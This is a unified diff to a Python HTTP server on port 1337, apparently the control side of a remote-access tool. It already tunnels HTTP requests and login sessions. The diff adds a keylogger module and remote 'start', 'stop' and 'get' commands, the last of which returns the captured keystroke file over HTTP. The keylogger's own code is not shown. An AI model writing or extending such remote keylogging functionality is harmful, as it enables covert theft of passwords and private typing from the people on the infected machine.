@@ -5,6 +5,7 @@ PORT = 1337;
 
 import http.server as hs;
 from modules.Tunnel import tunnel;
+from modules.Keylogger import keylogger;
 from urllib.parse import urlparse;
 import json;
 
@@ -46,7 +47,6 @@ class CustomRequestHandler(hs.BaseHTTPRequestHandler):
 				self.data["tunnel_obj"] = tunnel.Tunnel();
 			tunnel_obj = self.data["tunnel_obj"]; #retrieve tunnel object
 			url = value;
-			
 			if params["sub_action"] == "get":
 				ret = tunnel_obj.get(url);
 			elif params["sub_action"] == "post":
@@ -55,8 +55,15 @@ class CustomRequestHandler(hs.BaseHTTPRequestHandler):
 				ret = tunnel_obj.session(url);
 			elif params["sub_action"] == "login session":
 				ret = ret = tunnel_obj.login_session(url,extras);
-			
 			self.data["tunnel_obj"] = tunnel_obj; #store tunnel object
+		elif action == "keylogger":
+			sub_act = params["sub_action"];
+			if sub_act == "start":
+				ret = keylogger.start();
+			elif sub_act == "stop":
+				ret = keylogger.stop();
+			elif sub_act == "get":
+				ret = keylogger.get_file();
 		
 		return(ret);
 
